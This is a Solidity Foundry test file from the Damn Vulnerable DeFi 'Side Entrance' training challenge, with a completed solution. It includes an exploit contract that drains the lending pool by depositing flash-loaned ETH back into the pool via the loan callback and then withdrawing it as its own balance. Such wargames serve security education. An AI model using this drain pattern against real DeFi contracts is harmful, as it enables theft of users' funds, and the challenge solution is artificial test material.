// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {SideEntranceLenderPool} from "../../src/side-entrance/SideEntranceLenderPool.sol";

contract SideEntranceChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address recovery = makeAddr("recovery");

    uint256 constant ETHER_IN_POOL = 1000e18;
    uint256 constant PLAYER_INITIAL_ETH_BALANCE = 1e18;

    SideEntranceLenderPool pool;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);
        pool = new SideEntranceLenderPool();
        pool.deposit{value: ETHER_IN_POOL}();
        vm.deal(player, PLAYER_INITIAL_ETH_BALANCE);
        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public view {
        assertEq(address(pool).balance, ETHER_IN_POOL);
        assertEq(player.balance, PLAYER_INITIAL_ETH_BALANCE);
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_sideEntrance() public checkSolvedByPlayer {
        // Deploy exploit contract with pool and recovery addresses
        SideEntranceExploit exploit = new SideEntranceExploit(pool, recovery);
        // Trigger the attack with a flash loan of all ETH in the pool
        exploit.attack{value: 0}(ETHER_IN_POOL);
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        assertEq(address(pool).balance, 0, "Pool still has ETH");
        assertEq(recovery.balance, ETHER_IN_POOL, "Not enough ETH in recovery account");
    }
}


/**
 * @notice Exploit contract that drains ETH from SideEntranceLenderPool
 * @dev Leverages unguarded flash loan and deposit mechanism to steal funds
 *      by depositing borrowed ETH and withdrawing it as if it were own funds
 */
contract SideEntranceExploit {
    SideEntranceLenderPool public pool;
    address public recovery;

    /**
     * @notice Initializes the exploit with target pool and recovery address
     * @param _pool Address of the vulnerable lending pool
     * @param _recovery Address to send stolen ETH to
     */
    constructor(SideEntranceLenderPool _pool, address _recovery) {
        pool = _pool;
        recovery = _recovery;
    }

    /**
     * @notice Executes the full attack in one transaction
     * @dev Requests flash loan, which triggers execute(), enabling deposit
     *      Then withdraws all deposited ETH and sends to recovery
     * @param amount Amount of ETH to borrow via flash loan
     */
    function attack(uint256 amount) external payable {
        pool.flashLoan(amount);
        pool.withdraw();
        payable(recovery).transfer(address(this).balance);
    }

    /**
     * @notice Callback required by flash loan interface
     * @dev Called by pool during flashLoan; deposits borrowed ETH into pool
     *      This increases our balance in pool's accounting without spending own funds
     */
    function execute() external payable {
        pool.deposit{value: msg.value}();
    }

    /**
     * @notice Allows contract to receive ETH
     * @dev Required to receive funds from pool during withdrawal
     */
    receive() external payable {}
}
